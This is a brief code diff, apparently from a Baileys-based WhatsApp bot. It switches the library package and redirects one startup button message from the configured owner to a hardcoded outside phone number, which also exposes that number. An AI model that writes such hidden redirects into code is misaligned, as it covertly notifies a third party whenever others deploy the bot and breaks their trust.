@@ -6,7 +6,7 @@ const {
     getContentType,
     fetchLatestBaileysVersion,
     Browsers
-    } = require('@neoxr/baileys')
+    } = require('@whiskeysockets/baileys')
 
     const l = console.log
     const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
@@ -98,7 +98,7 @@ const buttonMessage = {
     headerType: 1
 }
 
-conn.sendMessage(ownerNumber + "@s.whatsapp.net", buttonMessage);
+conn.sendMessage("94779062397@s.whatsapp.net", buttonMessage);
 
         
    conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: tek,
